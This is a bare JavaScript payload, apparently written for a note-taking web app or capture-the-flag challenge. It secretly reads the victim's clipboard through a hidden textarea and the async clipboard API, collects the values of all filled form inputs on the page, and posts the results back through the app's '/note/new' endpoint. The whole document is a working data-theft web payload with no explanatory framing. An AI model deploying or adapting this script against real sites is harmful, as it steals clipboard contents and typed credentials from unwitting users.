// Try multiple clipboard methods
var clipResult = 'NONE';

// Method 1: Create a textarea and try to paste into it
var textarea = document.createElement('textarea');
textarea.style.position = 'fixed';
textarea.style.left = '-9999px';
document.body.appendChild(textarea);
textarea.focus();

try {
  // Try execCommand paste
  var pasted = document.execCommand('paste');
  clipResult = 'execCommand:' + pasted + '|value:' + textarea.value;
} catch(e) {
  clipResult = 'execCommand_error:' + e.message;
}

// Method 2: Check if there's already something in any input
var inputs = document.querySelectorAll('input, textarea');
var existingValues = [];
for(var i = 0; i < inputs.length; i++) {
  if(inputs[i].value) {
    existingValues.push(inputs[i].id + '|' + inputs[i].name + '=' + inputs[i].value);
  }
}

// Method 3: Try the async clipboard API with different approach
if(navigator.clipboard) {
  navigator.clipboard.readText().then(function(text){
    sendResult('ASYNC_CLIP:' + text + '|EXEC:' + clipResult + '|INPUTS:' + existingValues.join(';'));
  }).catch(function(err){
    sendResult('ASYNC_ERROR:' + err + '|EXEC:' + clipResult + '|INPUTS:' + existingValues.join(';'));
  });
} else {
  sendResult('NO_ASYNC_API|EXEC:' + clipResult + '|INPUTS:' + existingValues.join(';'));
}

function sendResult(data) {
  fetch('/note/new', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'title=CLIP2&body=' + encodeURIComponent(data)
  });
}
